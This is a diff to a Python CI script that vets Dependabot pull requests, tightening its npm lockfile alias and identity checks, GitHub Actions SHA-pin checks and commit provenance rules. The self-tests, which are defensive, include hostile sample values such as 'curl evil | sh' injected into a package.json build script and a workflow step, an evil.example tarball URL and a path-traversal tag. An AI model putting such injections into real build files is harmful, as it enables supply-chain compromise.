@@ -9,18 +9,19 @@ recognise:
   modified, plus the `npmDepsHash` line in flake.nix that
   nix-npm-hash-fix-pr.yml pushes. No file is added, deleted or renamed.
 - Manifests: only dependency version requirements change.
-- npm: registry entries use their canonical registry.npmjs.org tarball and
-  integrity; links remain unchanged and existing bundles change versions only.
-  No entry gains `hasInstallScript` or changes its linked/bundled state.
-- cargo: every new or changed `Cargo.lock` package comes from crates.io.
-- GitHub Actions: only `uses:` lines change, each keeps its action, pins a
-  40-hex SHA with a `# <tag>` comment, and that tag resolves upstream to the
-  same commit.
+- npm: registry entries keep their package identity, canonical tarball and
+  integrity. New aliases require matching base dependency declarations;
+  genuinely new declarations need manual review. Links remain unchanged
+  and existing bundles change versions only. No entry gains an install script.
+- cargo: every new or changed Cargo.lock package comes from crates.io.
+- GitHub Actions: only uses lines change, preserving their action and placement;
+  new refs pin a 40-hex SHA whose tag resolves upstream to the same commit.
 
 Usage:
     python3 .github/scripts/check-dependabot-pr.py --base <sha> --head <sha>
     Add --repo <owner/repo> --pr <number> to enforce commit provenance too.
-    Hash fixes need a nonexpired artifact from the trusted base workflow;
+    Dependabot commits need verified signatures and a Dependabot or web-flow
+    committer. Hash fixes need a nonexpired artifact from the base workflow;
     older unsigned commits without that proof require manual handling.
     python3 .github/scripts/check-dependabot-pr.py --self-test
 """
@@ -41,13 +42,14 @@ CRATES_IO_SOURCES = {
 }
 NAME = r"[A-Za-z0-9][\w.-]*"
 PINNED_USES = re.compile(
-    rf"^\+\s*(?:-\s*)?uses:\s*({NAME})/({NAME})((?:/{NAME})*)@([0-9a-f]{{40}})\s+#\s*(v?[0-9][\w.+-]*)\s*$"
+    rf"^\s*(?:-\s*)?uses:\s*({NAME})/({NAME})((?:/{NAME})*)@([0-9a-f]{{40}})\s+#\s*(v?[0-9][\w.+-]*)\s*$"
 )
-REMOVED_USES = re.compile(rf"^-\s*(?:-\s*)?uses:\s*({NAME}/{NAME}(?:/{NAME})*)@\S+(?:\s+#.*)?$")
+USES_LINE = re.compile(rf"^\s*(?:-\s*)?uses:\s*({NAME}/{NAME}(?:/{NAME})*)@\S+(?:\s+#.*)?$")
 # A version requirement only: no path, git, URL, alias or workspace specifier.
 VERSION_REQ = re.compile(r"^[\w.^~<>=*|, +-]+$")
 DEP_TABLES = {"dependencies", "dev-dependencies", "build-dependencies",
               "devDependencies", "optionalDependencies", "peerDependencies"}
+NPM_ALIAS = re.compile(r"npm:((?:@[^/@]+/)?[^/@]+)(?:@.+)?")
 NPM_DEPS_HASH = re.compile(r'^[+-]\s*npmDepsHash = "sha256-[A-Za-z0-9+/]{43}=";$')
 
 
@@ -75,9 +77,41 @@ def classify(path):
     return None
 
 
+def npm_name(key, entry):
+    return entry.get("name") or key.rpartition("node_modules/")[2]
+
+
 def npm_tarball(key, entry):
-    name = entry.get("name") or key.rpartition("node_modules/")[2]
+    name = npm_name(key, entry)
     return f"{NPM_REGISTRY}{name}/-/{name.rpartition('/')[2]}-{entry.get('version')}.tgz"
+
+
+def npm_alias_target(spec):
+    match = NPM_ALIAS.fullmatch(spec) if isinstance(spec, str) else None
+    return match.group(1) if match else None
+
+
+def authorized_npm_aliases(base, head):
+    aliases = set()
+    for owner_key, owner in base.items():
+        if owner_key not in head:
+            continue
+        for table in ("dependencies", "devDependencies", "optionalDependencies", "peerDependencies"):
+            for name, spec in owner.get(table, {}).items():
+                target = npm_alias_target(spec)
+                if target is None or npm_alias_target(head[owner_key].get(table, {}).get(name)) != target:
+                    continue
+                directory = PurePosixPath(owner_key)
+                while True:
+                    if directory.name != "node_modules":
+                        key = str(directory / "node_modules" / name)
+                        if key in head:
+                            aliases.add((key, target))
+                            break
+                    if directory == PurePosixPath("."):
+                        break
+                    directory = directory.parent
+    return aliases
 
 
 def bundled_metadata(entry, path, problems):
@@ -97,9 +131,10 @@ def check_npm_lock(path, base_text, head_text):
     problems = []
     base_doc, head_doc = json.loads(base_text), json.loads(head_text)
     if {k: v for k, v in base_doc.items() if k != "packages"} != {k: v for k, v in head_doc.items() if k != "packages"}:
-        problems.append(f"{path}: changes more than `packages`")
+        problems.append(f"{path}: changes more than packages")
     base = base_doc.get("packages", {})
     head = head_doc.get("packages", {})
+    aliases = authorized_npm_aliases(base, head)
     for key, entry in head.items():
         if key == "":
             continue
@@ -119,6 +154,11 @@ def check_npm_lock(path, base_text, head_text):
             elif bundled_metadata(before, where, []) != bundled_metadata(entry, where, problems):
                 problems.append(f"{where}: changes more than bundled dependency versions")
             continue
+        name = npm_name(key, entry)
+        if before is not None and name != npm_name(key, before):
+            problems.append(f"{where}: changes registry package identity")
+        elif before is None and name != npm_name(key, {}) and (key, name) not in aliases:
+            problems.append(f"{where}: new alias has no matching base dependency declaration")
         resolved = entry.get("resolved", "")
         if resolved != npm_tarball(key, entry):
             problems.append(f"{where}: resolves from {resolved or '<missing>'}, not {npm_tarball(key, entry)}")
@@ -191,33 +231,32 @@ def diff_changes(diff_text):
     ]
 
 
-def check_actions_diff(path, diff_text, resolve_tag):
-    """`resolve_tag(owner, repo, tag)` returns the commit SHA the tag points at."""
+def check_actions(path, base_text, head_text, resolve_tag):
+    """Preserve each source line's action and placement; verify changed refs upstream."""
+    before_lines = base_text.splitlines(keepends=True)
+    after_lines = head_text.splitlines(keepends=True)
+    if len(before_lines) != len(after_lines):
+        return [f"{path}: changes action step line counts"]
     problems = []
-    removed, added = [], []
-    for line in diff_changes(diff_text):
-        if line.startswith("-"):
-            m = REMOVED_USES.match(line)
-            if not m:
-                problems.append(f"{path}: removes a line other than `uses:`: {line[1:].strip()}")
-            else:
-                removed.append(m.group(1))
+    for before, after in zip(before_lines, after_lines):
+        if before == after:
             continue
-        m = PINNED_USES.match(line)
-        if not m:
-            problems.append(f"{path}: not a SHA-pinned `uses:` with a tag comment: {line[1:].strip()}")
+        old_match = USES_LINE.fullmatch(before.rstrip("\r\n"))
+        new_match = PINNED_USES.fullmatch(after.rstrip("\r\n"))
+        if old_match is None or new_match is None:
+            problems.append(f"{path}: changes a line other than a SHA-pinned uses update")
             continue
-        owner, repo, subpath, sha, tag = m.groups()
-        added.append(f"{owner}/{repo}{subpath}")
+        if before.split("@", 1)[0] != after.split("@", 1)[0]:
+            problems.append(f"{path}: changes an action or its step placement")
+            continue
+        owner, repo, _subpath, sha, tag = new_match.groups()
         try:
             actual = resolve_tag(owner, repo, tag)
-        except Exception as e:  # noqa: BLE001 - any lookup failure fails closed
+        except Exception as e:  # noqa: BLE001 - lookup failures fail closed
             problems.append(f"{path}: cannot resolve {owner}/{repo}@{tag}: {e}")
             continue
         if actual != sha:
             problems.append(f"{path}: {owner}/{repo} {tag} is {actual}, PR pins {sha}")
-    if sorted(removed) != sorted(added):
-        problems.append(f"{path}: `uses:` actions change from {sorted(removed)} to {sorted(added)}")
     return problems
 
 
@@ -245,7 +284,7 @@ def check(changed, read, diff, resolve_tag):
         elif kind == "manifest":
             problems += check_manifest(path, read("base", path), read("head", path))
         elif kind == "actions":
-            problems += check_actions_diff(path, diff(path), resolve_tag)
+            problems += check_actions(path, read("base", path), read("head", path), resolve_tag)
         elif kind == "nix-hash":
             problems += check_nix_hash_diff(path, diff(path))
     return problems
@@ -302,8 +341,9 @@ def check_commits(commits, expected_shas, inspect, trusted):
     for commit in commits:
         sha = commit["sha"]
         author = (commit.get("author") or {}).get("login")
+        committer = (commit.get("committer") or {}).get("login")
         verified = commit["commit"].get("verification", {}).get("verified") is True
-        if author == "dependabot[bot]" and verified:
+        if author == "dependabot[bot]" and verified and committer in {"dependabot[bot]", "web-flow"}:
             continue
         if author != "github-actions[bot]":
             problems.append(f"{sha}: not a verified Dependabot commit or a trusted hash fix")
@@ -361,7 +401,7 @@ def run(base, head, repo=None, pr=None):
 
 
 def self_test():
-    sha_a, sha_b = "a" * 40, "b" * 40
+    sha_a, sha_b, sha_c = "a" * 40, "b" * 40, "c" * 40
     bundle_entry = {"version": "1.0.0", "inBundle": True, "dependencies": {"left-pad": "^1.0.0"}}
     npm_base = json.dumps({"packages": {
         "": {"name": "web"},
@@ -390,17 +430,28 @@ def self_test():
     pkg_json = json.dumps({"name": "web", "scripts": {"build": "vite build"}, "dependencies": {"left-pad": "^1.0.0"}})
 
     def resolver(owner, repo, tag):
-        return {"v2.0.0": sha_a}[tag]
+        return {"v2.0.0": sha_a, "v3.0.0": sha_c}[tag]
 
-    old_co = "-      - uses: actions/checkout@" + sha_b + " # v1.0.0\n"
+    old_co = f"      - uses: actions/checkout@{sha_b} # v1.0.0\n"
+    new_co = f"      - uses: actions/checkout@{sha_a} # v2.0.0\n"
+    old_cache = f"      - uses: Swatinem/rust-cache@{sha_b} # v1.0.0\n"
+    new_cache = f"      - uses: Swatinem/rust-cache@{sha_a} # v2.0.0\n"
+    latest_co = f"      - uses: actions/checkout@{sha_c} # v3.0.0\n"
     nix_old = '-  npmDepsHash = "sha256-' + "A" * 43 + '=";\n'
     nix_new = '+  npmDepsHash = "sha256-' + "B" * 43 + '=";\n'
     lock = "web/package-lock.json"
     wf = ".github/workflows/ci.yml"
+
+    def action_case(name, before, after, expected, path=wf):
+        return name, [path], {path: (before, after)}, "", expected
+
     cases = [
         ("npm registry bump", [lock], {lock: (npm_base, npm_head(**{"left-pad": good_entry}))}, "", 0),
         ("npm foreign tarball", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "resolved": "https://evil.example/x.tgz"}}))}, "", 1),
         ("npm other registry package", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "resolved": NPM_REGISTRY + "evil/-/evil-1.1.0.tgz"}}))}, "", 1),
+        ("npm foreign identity in name", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "name": "evil", "resolved": NPM_REGISTRY + "evil/-/evil-1.1.0.tgz"}}))}, "", 1),
+        ("npm explicit unchanged identity", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "name": "left-pad"}}))}, "", 0),
+        ("npm new ordinary transitive package", [lock], {lock: (npm_base, npm_head(child={"version": "1.0.0", "resolved": NPM_REGISTRY + "child/-/child-1.0.0.tgz", "integrity": "sha512-child"}))}, "", 0),
         ("npm new install script", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "hasInstallScript": True}}))}, "", 1),
         ("npm existing install script", [lock], {lock: (npm_base, npm_head(esbuild={"version": "0.2.0", "resolved": NPM_REGISTRY + "esbuild/-/esbuild-0.2.0.tgz", "integrity": "sha512-z", "hasInstallScript": True}))}, "", 0),
         ("npm missing integrity", [lock], {lock: (npm_base, npm_head(**{"left-pad": {**good_entry, "integrity": ""}}))}, "", 1),
@@ -426,15 +477,26 @@ def self_test():
         ("npm manifest bump", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("^1.0.0", "^1.1.0"))}, "", 0),
         ("npm manifest script", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("vite build", "curl evil | sh"))}, "", 1),
         ("npm manifest git dep", ["web/package.json"], {"web/package.json": (pkg_json, pkg_json.replace("^1.0.0", "github:evil/left-pad"))}, "", 1),
-        ("actions matching tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v2.0.0\n", 0),
-        ("actions subpath", [".github/actions/x/action.yml"], {}, f"-    - uses: github/codeql-action/init@{sha_b} # v1.0.0\n+    - uses: github/codeql-action/init@{sha_a} # v2.0.0\n", 0),
-        ("actions mismatched tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_b} # v2.0.0\n", 1),
-        ("actions unknown tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v9\n", 1),
-        ("actions unpinned", [wf], {}, old_co + "+      - uses: actions/checkout@v2\n", 1),
-        ("actions other repo", [wf], {}, old_co + f"+      - uses: evil/checkout@{sha_a} # v2.0.0\n", 1),
-        ("actions extra run line", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v2.0.0\n+      - run: curl evil | sh\n", 1),
-        ("actions removed step", [wf], {}, "-      - run: cargo deny check\n", 1),
-        ("actions traversal tag", [wf], {}, old_co + f"+      - uses: actions/checkout@{sha_a} # v2/../../evil\n", 1),
+        action_case("actions matching tag", old_co, new_co, 0),
+        action_case("actions subpath", f"    - uses: github/codeql-action/init@{sha_b} # v1.0.0\n", f"    - uses: github/codeql-action/init@{sha_a} # v2.0.0\n", 0, ".github/actions/x/action.yml"),
+        action_case("actions mismatched tag", old_co, f"      - uses: actions/checkout@{sha_b} # v2.0.0\n", 1),
+        action_case("actions unknown tag", old_co, f"      - uses: actions/checkout@{sha_a} # v9\n", 1),
+        action_case("actions unpinned", old_co, "      - uses: actions/checkout@v2\n", 1),
+        action_case("actions other repo", old_co, f"      - uses: evil/checkout@{sha_a} # v2.0.0\n", 1),
+        action_case("actions extra run line", old_co, new_co + "      - run: curl evil | sh\n", 1),
+        action_case("actions removed step", "      - run: cargo deny check\n", "", 1),
+        action_case("actions traversal tag", old_co, f"      - uses: actions/checkout@{sha_a} # v2/../../evil\n", 1),
+        action_case("actions adjacent updates", old_co + old_cache, new_co + new_cache, 0),
+        action_case("actions separated updates", old_co + "      - run: true\n" + old_cache, new_co + "      - run: true\n" + new_cache, 0),
+        action_case("actions repeated action updates", old_co + old_co, new_co + new_co, 0),
+        action_case("actions overlapping repeated refs", old_co + new_co, new_co + latest_co, 0),
+        action_case("actions unchanged local action", old_co + "      - uses: ./.github/actions/rust-toolchain\n", new_co + "      - uses: ./.github/actions/rust-toolchain\n", 0),
+        action_case("actions swapped between steps", old_co + old_cache, new_cache + new_co, 1),
+        action_case("actions same action moved", old_co + "      - run: true\n", "      - run: true\n" + new_co, 1),
+        action_case("actions indentation change", old_co, "  " + new_co, 1),
+        action_case("actions step dash removed", old_co, new_co.replace("- uses:", "uses:"), 1),
+        action_case("actions added step", old_co, new_co + new_co, 1),
+        action_case("actions binary source", old_co, new_co + chr(0), 1),
         ("deleted workflow", [("D", wf)], {}, "", 1),
         ("nix hash only", ["flake.nix"], {}, nix_old + nix_new, 0),
         ("nix duplicate hash additions", ["flake.nix"], {}, nix_new + nix_new, 1),
@@ -442,6 +504,30 @@ def self_test():
         ("nix other line", ["flake.nix"], {}, nix_old + nix_new + "+  src = ./evil;\n", 1),
         ("unexpected file", ["build.rs"], {}, "", 1),
     ]
+    alias_entry = {"name": "@scope/real", "version": "1.0.0", "resolved": NPM_REGISTRY + "@scope/real/-/real-1.0.0.tgz", "integrity": "sha512-alias"}
+    alias_root = {"dependencies": {"alias": "npm:@scope/real@^1.0.0"}}
+    alias_base = {"": alias_root, "node_modules/alias": alias_entry}
+    alias_bump = {**alias_entry, "version": "1.1.0", "resolved": NPM_REGISTRY + "@scope/real/-/real-1.1.0.tgz"}
+    foreign_alias = {**alias_entry, "name": "@scope/other", "resolved": NPM_REGISTRY + "@scope/other/-/other-1.0.0.tgz"}
+    parent = {"version": "1.0.0", "resolved": NPM_REGISTRY + "parent/-/parent-1.0.0.tgz", "integrity": "sha512-parent", "optionalDependencies": {"child": "npm:@scope/real@^1.0.0"}}
+    parent_base = {"": {}, "node_modules/parent": parent}
+    plain_child = {"version": "1.0.0", "resolved": NPM_REGISTRY + "child/-/child-1.0.0.tgz", "integrity": "sha512-child"}
+    npm_alias_cases = [
+        ("existing alias version bump", alias_base, {**alias_base, "node_modules/alias": alias_bump}, 0),
+        ("existing alias target change", alias_base, {**alias_base, "node_modules/alias": foreign_alias}, 1),
+        ("existing alias loses name", alias_base, {**alias_base, "node_modules/alias": {k: v for k, v in alias_entry.items() if k != "name"}}, 1),
+        ("base-declared new root alias", {"": alias_root}, alias_base, 0),
+        ("head-only new root alias", {"": {}}, alias_base, 1),
+        ("base-declared new hoisted optional alias", parent_base, {**parent_base, "node_modules/child": alias_entry}, 0),
+        ("base-declared new nested optional alias", parent_base, {**parent_base, "node_modules/parent/node_modules/child": alias_entry}, 0),
+        ("alias declaration shadowed by nearest package", parent_base, {**parent_base, "node_modules/child": alias_entry, "node_modules/parent/node_modules/child": plain_child}, 1),
+        ("alias at unrelated nested location", parent_base, {**parent_base, "node_modules/other/node_modules/child": alias_entry}, 1),
+        ("alias declaration owner removed", parent_base, {"": {}, "node_modules/child": alias_entry}, 1),
+        ("alias declaration retargeted in head", parent_base, {**parent_base, "node_modules/parent": {**parent, "optionalDependencies": {"child": "npm:@scope/other@1.0.0"}}, "node_modules/child": foreign_alias}, 1),
+        ("upgraded parent cannot declare a new alias", {"": {}, "node_modules/parent": {k: v for k, v in parent.items() if k != "optionalDependencies"}}, {**parent_base, "node_modules/parent": {**parent, "version": "1.1.0", "resolved": NPM_REGISTRY + "parent/-/parent-1.1.0.tgz"}, "node_modules/child": alias_entry}, 1),
+    ]
+    cases.extend((name, [lock], {lock: (json.dumps({"packages": before}), json.dumps({"packages": after}))}, "", expected)
+                 for name, before, after, expected in npm_alias_cases)
     failed = 0
     for name, changed, files, diff_text, expected in cases:
         def read(rev, path, files=files):
@@ -476,10 +562,17 @@ def self_test():
             print(f"FAIL provenance {name}")
 
     dependabot = {"sha": sha_a, "author": {"login": "dependabot[bot]"},
-                  "commit": {"verification": {"verified": True}}}
+                  "committer": {"login": "web-flow"}, "commit": {"verification": {"verified": True}}}
     fixer = {"sha": sha_b, "author": {"login": "github-actions[bot]"},
              "commit": {"verification": {"verified": False}}}
     commit_cases = [
+        ("verified Dependabot committer", {**dependabot, "sha": sha_b, "committer": {"login": "dependabot[bot]"}}, [], [], "", False, [sha_a, sha_b], False),
+        ("verified foreign committer", {**dependabot, "sha": sha_b, "committer": {"login": "human"}}, [], [], "", False, [sha_a, sha_b], True),
+        ("verified missing committer", {k: (sha_b if k == "sha" else v) for k, v in dependabot.items() if k != "committer"}, [], [], "", False, [sha_a, sha_b], True),
+        ("verified null committer", {**dependabot, "sha": sha_b, "committer": None}, [], [], "", False, [sha_a, sha_b], True),
+        ("unverified allowed committer", {**dependabot, "sha": sha_b, "commit": {"verification": {"verified": False}}}, [], [], "", False, [sha_a, sha_b], True),
+        ("verified foreign author", {**dependabot, "sha": sha_b, "author": {"login": "human"}}, [], [], "", False, [sha_a, sha_b], True),
+        ("signed authentic hash fix", {**fixer, "commit": {"verification": {"verified": True}}}, [sha_a], [("M", "flake.nix")], nix_old + nix_new, True, [sha_a, sha_b], False),
         ("signed Dependabot and unsigned authentic fix", fixer, [sha_a], [("M", "flake.nix")], nix_old + nix_new, True, [sha_a, sha_b], False),
         ("major version in claimed hash fix", fixer, [sha_a], [("M", "web/package.json")], "", True, [sha_a, sha_b], True),
         ("hash fix with extra file", fixer, [sha_a], [("M", "flake.nix"), ("M", "web/package.json")], nix_old + nix_new, True, [sha_a, sha_b], True),
@@ -491,8 +584,11 @@ def self_test():
         ("stale or incomplete API commits", fixer, [sha_a], [("M", "flake.nix")], nix_old + nix_new, True, [sha_a], True),
     ]
     for name, commit, parents, changed, diff_text, authentic, expected_shas, expected in commit_cases:
-        problems = check_commits([dependabot, commit], expected_shas,
-                                 lambda _sha: (parents, changed, diff_text), lambda _sha: authentic)
+        problems = check_commits(
+            [dependabot, commit], expected_shas,
+            lambda _sha, parents=parents, changed=changed, diff_text=diff_text: (parents, changed, diff_text),
+            lambda _sha, authentic=authentic: authentic,
+        )
         if bool(problems) != expected:
             failed += 1
             print(f"FAIL commits {name}: {problems}")
